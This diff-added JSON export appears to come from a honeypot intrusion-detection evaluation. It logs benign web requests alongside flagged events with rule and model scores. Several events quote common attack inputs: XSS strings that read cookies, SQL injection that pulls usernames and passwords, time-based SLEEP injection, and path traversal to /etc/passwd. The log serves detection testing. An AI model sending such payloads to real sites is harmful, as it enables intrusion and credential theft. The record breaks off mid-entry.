+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-35\", \"X-Forwarded-For\": \"203.0.113.99\"}",
+      "is_suspicious": 0,
+      "threat_score": 0,
+      "create_time": "2026-11-07 22:59:56"
+    },
+    {
+      "id": 168,
+      "src_ip": "198.51.100.23",
+      "method": "GET",
+      "path": "/about",
+      "query_string": "",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-36\", \"X-Forwarded-For\": \"198.51.100.23\"}",
+      "is_suspicious": 0,
+      "threat_score": 0,
+      "create_time": "2026-11-07 22:59:57"
+    },
+    {
+      "id": 169,
+      "src_ip": "198.51.100.77",
+      "method": "GET",
+      "path": "/products",
+      "query_string": "",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-37\", \"X-Forwarded-For\": \"198.51.100.77\"}",
+      "is_suspicious": 0,
+      "threat_score": 0,
+      "create_time": "2026-11-07 22:59:57"
+    },
+    {
+      "id": 170,
+      "src_ip": "192.0.2.31",
+      "method": "GET",
+      "path": "/news",
+      "query_string": "id=1",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-38\", \"X-Forwarded-For\": \"192.0.2.31\"}",
+      "is_suspicious": 0,
+      "threat_score": 0,
+      "create_time": "2026-11-07 22:59:58"
+    },
+    {
+      "id": 171,
+      "src_ip": "192.0.2.88",
+      "method": "GET",
+      "path": "/search",
+      "query_string": "q=python+tutorial",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-39\", \"X-Forwarded-For\": \"192.0.2.88\"}",
+      "is_suspicious": 0,
+      "threat_score": 0,
+      "create_time": "2026-11-07 22:59:58"
+    },
+    {
+      "id": 172,
+      "src_ip": "192.0.2.200",
+      "method": "GET",
+      "path": "/solutions",
+      "query_string": "",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-40\", \"X-Forwarded-For\": \"192.0.2.200\"}",
+      "is_suspicious": 0,
+      "threat_score": 0,
+      "create_time": "2026-11-07 22:59:59"
+    }
+  ],
+  "events": [
+    {
+      "id": 233,
+      "timestamp": "2026-11-07 22:59:30",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "xss_ai_detected",
+      "src_ip": "203.0.113.17",
+      "raw_request_id": 133,
+      "payload": "[AI判定xss] GET /search?q=<script>alert(document.cookie)</script> | [query.q] 规则命中 xss(+22): 检测到 <script> 标签内联脚本；模型判定: xss(1.00)",
+      "extra": "{\"score\": 47, \"signals\": [\"疑似XSS特征\", \"AI判定xss(+25分): [query.q] 规则命中 xss(+22): 检测到 <script> 标签内联脚本；模型判定: xss(1.00)\"], \"method\": \"GET\", \"path\": \"/search\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 22, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"xss\", \"is_attack\": true, \"attack_prob\": 1.0, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[query.q] 规则命中 xss(+22): 检测到 <script> 标签内联脚本；模型判定: xss(1.00)\"], \"signals\": [{\"field\": \"query.q\", \"value\": \"%3Cscript%3Ealert(document.cookie)%3C/script%3E\", \"attack_type\": \"xss\", \"attack_prob\": 1.0, \"ai_points\": 25, \"fusion_score\": 47, \"high_risk\": true, \"reason\": \"规则命中 xss(+22): 检测到 <script> 标签内联脚本；模型判定: xss(1.00)\"}], \"model_label\": \"xss\", \"source\": \"web\", \"ip\": \"203.0.113.*\", \"session_id\": \"b48e316ec7464e33\", \"request_id\": \"\", \"latency_ms\": 41.953, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 7, \"query_length\": 49, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 234,
+      "timestamp": "2026-11-07 22:59:31",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "xss_ai_detected",
+      "src_ip": "203.0.113.45",
+      "raw_request_id": 134,
+      "payload": "[AI判定xss] GET /search?q=<img src=x onerror=alert(1)> | [query.q] 规则命中 xss(+22): 检测到 alert() 弹窗函数；模型判定: xss(1.00)",
+      "extra": "{\"score\": 47, \"signals\": [\"疑似XSS特征\", \"AI判定xss(+25分): [query.q] 规则命中 xss(+22): 检测到 alert() 弹窗函数；模型判定: xss(1.00)\"], \"method\": \"GET\", \"path\": \"/search\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 22, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"xss\", \"is_attack\": true, \"attack_prob\": 1.0, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[query.q] 规则命中 xss(+22): 检测到 alert() 弹窗函数；模型判定: xss(1.00)\"], \"signals\": [{\"field\": \"query.q\", \"value\": \"%3Cimg%20src=x%20onerror=alert(1)%3E\", \"attack_type\": \"xss\", \"attack_prob\": 1.0, \"ai_points\": 25, \"fusion_score\": 47, \"high_risk\": true, \"reason\": \"规则命中 xss(+22): 检测到 alert() 弹窗函数；模型判定: xss(1.00)\"}], \"model_label\": \"xss\", \"source\": \"web\", \"ip\": \"203.0.113.*\", \"session_id\": \"0f9ecdf3342cee43\", \"request_id\": \"\", \"latency_ms\": 42.177, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 7, \"query_length\": 38, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 235,
+      "timestamp": "2026-11-07 22:59:31",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "xss_ai_detected",
+      "src_ip": "203.0.113.99",
+      "raw_request_id": 135,
+      "payload": "[AI判定xss] GET /search?q=<svg/onload=alert(1)> | [query.q] 规则命中 xss(+22): 检测到 alert() 弹窗函数；模型判定: xss(1.00)",
+      "extra": "{\"score\": 47, \"signals\": [\"疑似XSS特征\", \"AI判定xss(+25分): [query.q] 规则命中 xss(+22): 检测到 alert() 弹窗函数；模型判定: xss(1.00)\"], \"method\": \"GET\", \"path\": \"/search\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 22, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"xss\", \"is_attack\": true, \"attack_prob\": 0.9999, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[query.q] 规则命中 xss(+22): 检测到 alert() 弹窗函数；模型判定: xss(1.00)\"], \"signals\": [{\"field\": \"query.q\", \"value\": \"%3Csvg/onload=alert(1)%3E\", \"attack_type\": \"xss\", \"attack_prob\": 0.9999, \"ai_points\": 25, \"fusion_score\": 47, \"high_risk\": true, \"reason\": \"规则命中 xss(+22): 检测到 alert() 弹窗函数；模型判定: xss(1.00)\"}], \"model_label\": \"xss\", \"source\": \"web\", \"ip\": \"203.0.113.*\", \"session_id\": \"b2ecd9ac1fd19f22\", \"request_id\": \"\", \"latency_ms\": 38.973, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 7, \"query_length\": 27, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 236,
+      "timestamp": "2026-11-07 22:59:32",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "xss_ai_detected",
+      "src_ip": "198.51.100.23",
+      "raw_request_id": 136,
+      "payload": "[AI判定xss] GET /search?q=<script>alert(1)</script> | [query.q] 规则命中 xss(+22): 检测到 <script> 标签内联脚本；模型判定: xss(1.00)",
+      "extra": "{\"score\": 47, \"signals\": [\"疑似XSS特征\", \"AI判定xss(+25分): [query.q] 规则命中 xss(+22): 检测到 <script> 标签内联脚本；模型判定: xss(1.00)\"], \"method\": \"GET\", \"path\": \"/search\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 22, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"xss\", \"is_attack\": true, \"attack_prob\": 1.0, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[query.q] 规则命中 xss(+22): 检测到 <script> 标签内联脚本；模型判定: xss(1.00)\"], \"signals\": [{\"field\": \"query.q\", \"value\": \"%3Cscript%3Ealert%281%29%3C%2Fscript%3E\", \"attack_type\": \"xss\", \"attack_prob\": 1.0, \"ai_points\": 25, \"fusion_score\": 47, \"high_risk\": true, \"reason\": \"规则命中 xss(+22): 检测到 <script> 标签内联脚本；模型判定: xss(1.00)\"}], \"model_label\": \"xss\", \"source\": \"web\", \"ip\": \"198.51.100.*\", \"session_id\": \"e1d3fb7311d0bfdc\", \"request_id\": \"\", \"latency_ms\": 37.836, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 7, \"query_length\": 41, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 237,
+      "timestamp": "2026-11-07 22:59:33",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "xss_ai_detected",
+      "src_ip": "198.51.100.77",
+      "raw_request_id": 137,
+      "payload": "[AI判定xss] GET /search?q=javascript:alert(1)// | [query.q] 规则命中 xss(+22): 检测到 javascript: 伪协议；模型判定: xss(1.00)",
+      "extra": "{\"score\": 47, \"signals\": [\"疑似XSS特征\", \"AI判定xss(+25分): [query.q] 规则命中 xss(+22): 检测到 javascript: 伪协议；模型判定: xss(1.00)\"], \"method\": \"GET\", \"path\": \"/search\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 22, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"xss\", \"is_attack\": true, \"attack_prob\": 1.0, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[query.q] 规则命中 xss(+22): 检测到 javascript: 伪协议；模型判定: xss(1.00)\"], \"signals\": [{\"field\": \"query.q\", \"value\": \"javascript:alert(1)//\", \"attack_type\": \"xss\", \"attack_prob\": 1.0, \"ai_points\": 25, \"fusion_score\": 47, \"high_risk\": true, \"reason\": \"规则命中 xss(+22): 检测到 javascript: 伪协议；模型判定: xss(1.00)\"}], \"model_label\": \"xss\", \"source\": \"web\", \"ip\": \"198.51.100.*\", \"session_id\": \"e0ac3ef3fc71402e\", \"request_id\": \"\", \"latency_ms\": 40.837, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 7, \"query_length\": 23, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 238,
+      "timestamp": "2026-11-07 22:59:33",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "sqli_ai_detected",
+      "src_ip": "192.0.2.31",
+      "raw_request_id": 138,
+      "payload": "[AI判定sqli] GET /products?id=1 UNION SELECT username,password FROM users | [query.id] 规则命中 sqli(+25): 检测到 SQL 注入的 UNION SELECT；模型判定: sqli(0.99)",
+      "extra": "{\"score\": 50, \"signals\": [\"疑似SQL注入特征\", \"AI判定sqli(+25分): [query.id] 规则命中 sqli(+25): 检测到 SQL 注入的 UNION SELECT；模型判定: sqli(0.99)\"], \"method\": \"GET\", \"path\": \"/products\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 25, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"sqli\", \"is_attack\": true, \"attack_prob\": 0.9915, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[query.id] 规则命中 sqli(+25): 检测到 SQL 注入的 UNION SELECT；模型判定: sqli(0.99)\"], \"signals\": [{\"field\": \"query.id\", \"value\": \"1%20UNION%20SELECT%20username,password%20FROM%20users\", \"attack_type\": \"sqli\", \"attack_prob\": 0.9915, \"ai_points\": 25, \"fusion_score\": 50, \"high_risk\": true, \"reason\": \"规则命中 sqli(+25): 检测到 SQL 注入的 UNION SELECT；模型判定: sqli(0.99)\"}], \"model_label\": \"sqli\", \"source\": \"web\", \"ip\": \"192.0.2.*\", \"session_id\": \"ae47f50684b7e372\", \"request_id\": \"\", \"latency_ms\": 18.035, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 9, \"query_length\": 56, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 239,
+      "timestamp": "2026-11-07 22:59:34",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "sqli_ai_detected",
+      "src_ip": "192.0.2.88",
+      "raw_request_id": 139,
+      "payload": "[AI判定sqli] GET /products?id=1' OR '1'='1 | [query.id] 规则命中 sqli(+25): 检测到 SQL 注入的字符串恒等式；模型判定: sqli(0.99)",
+      "extra": "{\"score\": 50, \"signals\": [\"疑似SQL注入特征\", \"AI判定sqli(+25分): [query.id] 规则命中 sqli(+25): 检测到 SQL 注入的字符串恒等式；模型判定: sqli(0.99)\"], \"method\": \"GET\", \"path\": \"/products\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 25, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"sqli\", \"is_attack\": true, \"attack_prob\": 0.9943, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[query.id] 规则命中 sqli(+25): 检测到 SQL 注入的字符串恒等式；模型判定: sqli(0.99)\"], \"signals\": [{\"field\": \"query.id\", \"value\": \"1'%20OR%20'1'='1\", \"attack_type\": \"sqli\", \"attack_prob\": 0.9943, \"ai_points\": 25, \"fusion_score\": 50, \"high_risk\": true, \"reason\": \"规则命中 sqli(+25): 检测到 SQL 注入的字符串恒等式；模型判定: sqli(0.99)\"}], \"model_label\": \"sqli\", \"source\": \"web\", \"ip\": \"192.0.2.*\", \"session_id\": \"5c71142218844f27\", \"request_id\": \"\", \"latency_ms\": 35.904, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 9, \"query_length\": 19, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 240,
+      "timestamp": "2026-11-07 22:59:34",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "sqli_ai_detected",
+      "src_ip": "192.0.2.200",
+      "raw_request_id": 140,
+      "payload": "[AI判定sqli] GET /products?id=admin'-- | [query.id] 规则命中 sqli(+25): 命中SQL 注入特征: ' [sx00]*；模型判定: sqli(0.90)",
+      "extra": "{\"score\": 40, \"signals\": [\"AI判定sqli(+23分): [query.id] 规则命中 sqli(+25): 命中SQL 注入特征: ' [sx00]*；模型判定: sqli(0.90)\"], \"method\": \"GET\", \"path\": \"/products\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 0, \"is_suspicious\": false}, \"ai\": {\"attack_type\": \"sqli\", \"is_attack\": true, \"attack_prob\": 0.9457, \"ai_points\": 23, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[query.id] 规则命中 sqli(+25): 命中SQL 注入特征: ' [sx00]*；模型判定: sqli(0.90)\"], \"signals\": [{\"field\": \"query.id\", \"value\": \"admin'--\", \"attack_type\": \"sqli\", \"attack_prob\": 0.9457, \"ai_points\": 23, \"fusion_score\": 48, \"high_risk\": true, \"reason\": \"规则命中 sqli(+25): 命中SQL 注入特征: ' [sx00]*；模型判定: sqli(0.90)\"}], \"model_label\": \"sqli\", \"source\": \"web\", \"ip\": \"192.0.2.*\", \"session_id\": \"a68093cc7f459145\", \"request_id\": \"\", \"latency_ms\": 36.004, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 23, \"ai_service_points\": 23, \"ai_input\": {\"path_length\": 9, \"query_length\": 11, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 241,
+      "timestamp": "2026-11-07 22:59:35",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "sqli_ai_detected",
+      "src_ip": "203.0.113.17",
+      "raw_request_id": 141,
+      "payload": "[AI判定sqli] GET /products?id=1 AND SLEEP(5) | [query.id] 规则命中 sqli(+25): 检测到 SQL 时间盲注函数 sleep()；模型判定: sqli(1.00)",
+      "extra": "{\"score\": 50, \"signals\": [\"疑似SQL注入特征\", \"AI判定sqli(+25分): [query.id] 规则命中 sqli(+25): 检测到 SQL 时间盲注函数 sleep()；模型判定: sqli(1.00)\"], \"method\": \"GET\", \"path\": \"/products\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 25, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"sqli\", \"is_attack\": true, \"attack_prob\": 0.9993, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[query.id] 规则命中 sqli(+25): 检测到 SQL 时间盲注函数 sleep()；模型判定: sqli(1.00)\"], \"signals\": [{\"field\": \"query.id\", \"value\": \"1%20AND%20SLEEP(5)\", \"attack_type\": \"sqli\", \"attack_prob\": 0.9993, \"ai_points\": 25, \"fusion_score\": 50, \"high_risk\": true, \"reason\": \"规则命中 sqli(+25): 检测到 SQL 时间盲注函数 sleep()；模型判定: sqli(1.00)\"}], \"model_label\": \"sqli\", \"source\": \"web\", \"ip\": \"203.0.113.*\", \"session_id\": \"b48e316ec7464e33\", \"request_id\": \"\", \"latency_ms\": 42.244, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 9, \"query_length\": 21, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 242,
+      "timestamp": "2026-11-07 22:59:36",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "sqli_ai_detected",
+      "src_ip": "203.0.113.45",
+      "raw_request_id": 142,
+      "payload": "[AI判定sqli] GET /products?id=1' UNION SELECT username,password FROM users | [query.id] 规则命中 sqli(+25): 检测到 SQL 注入的 UNION SELECT；模型判定: sqli(0.99)",
+      "extra": "{\"score\": 50, \"signals\": [\"疑似SQL注入特征\", \"AI判定sqli(+25分): [query.id] 规则命中 sqli(+25): 检测到 SQL 注入的 UNION SELECT；模型判定: sqli(0.99)\"], \"method\": \"GET\", \"path\": \"/products\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 25, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"sqli\", \"is_attack\": true, \"attack_prob\": 0.9967, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[query.id] 规则命中 sqli(+25): 检测到 SQL 注入的 UNION SELECT；模型判定: sqli(0.99)\"], \"signals\": [{\"field\": \"query.id\", \"value\": \"1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users\", \"attack_type\": \"sqli\", \"attack_prob\": 0.9967, \"ai_points\": 25, \"fusion_score\": 50, \"high_risk\": true, \"reason\": \"规则命中 sqli(+25): 检测到 SQL 注入的 UNION SELECT；模型判定: sqli(0.99)\"}], \"model_label\": \"sqli\", \"source\": \"web\", \"ip\": \"203.0.113.*\", \"session_id\": \"0f9ecdf3342cee43\", \"request_id\": \"\", \"latency_ms\": 17.701, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 9, \"query_length\": 61, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 243,
+      "timestamp": "2026-11-07 22:59:36",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "path_traversal_ai_detected",
+      "src_ip": "203.0.113.99",
+      "raw_request_id": 143,
+      "payload": "[AI判定path_traversal] GET /page?file=../../../../etc/passwd | [query.file] 规则命中 path_traversal(+22): 检测到路径遍历攻击 ../；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: path_traversal(1",
+      "extra": "{\"score\": 47, \"signals\": [\"目录穿越/LFI特征\", \"AI判定path_traversal(+25分): [query.file] 规则命中 path_traversal(+22): 检测到路径遍历攻击 ../；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: path_traversal(1.00)\"], \"method\": \"GET\", \"path\": \"/page\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 22, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"path_traversal\", \"is_attack\": true, \"attack_prob\": 1.0, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[query.file] 规则命中 path_traversal(+22): 检测到路径遍历攻击 ../；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: path_traversal(1.00)\"], \"signals\": [{\"field\": \"query.file\", \"value\": \"../../../../etc/passwd\", \"attack_type\": \"path_traversal\", \"attack_prob\": 1.0, \"ai_points\": 25, \"fusion_score\": 47, \"high_risk\": true, \"reason\": \"规则命中 path_traversal(+22): 检测到路径遍历攻击 ../；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: path_traversal(1.00)\"}], \"model_label\": \"path_traversal\", \"source\": \"web\", \"ip\": \"203.0.113.*\", \"session_id\": \"b2ecd9ac1fd19f22\", \"request_id\": \"\", \"latency_ms\": 31.59, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 5, \"query_length\": 27, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 244,
+      "timestamp": "2026-11-07 22:59:37",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "path_traversal_ai_detected",
+      "src_ip": "198.51.100.23",
+      "raw_request_id": 144,
+      "payload": "[AI判定path_traversal] GET /page?file=../../../etc/passwd | [query.file] 规则命中 path_traversal(+22): 检测到路径遍历攻击 ../；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: path_traversal(1.00",
+      "extra": "{\"score\": 47, \"signals\": [\"目录穿越/LFI特征\", \"AI判定path_traversal(+25分): [query.file] 规则命中 path_traversal(+22): 检测到路径遍历攻击 ../；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: path_traversal(1.00)\"], \"method\": \"GET\", \"path\": \"/page\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 22, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"path_traversal\", \"is_attack\": true, \"attack_prob\": 1.0, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[query.file] 规则命中 path_traversal(+22): 检测到路径遍历攻击 ../；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: path_traversal(1.00)\"], \"signals\": [{\"field\": \"query.file\", \"value\": \"..%2F..%2F..%2Fetc%2Fpasswd\", \"attack_type\": \"path_traversal\", \"attack_prob\": 1.0, \"ai_points\": 25, \"fusion_score\": 47, \"high_risk\": true, \"reason\": \"规则命中 path_traversal(+22): 检测到路径遍历攻击 ../；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: path_traversal(1.00)\"}], \"model_label\": \"path_traversal\", \"source\": \"web\", \"ip\": \"198.51.100.*\", \"session_id\": \"e1d3fb7311d0bfdc\", \"request_id\": \"\", \"latency_ms\": 40.98, \"model\": {\"version\": \"v2\", 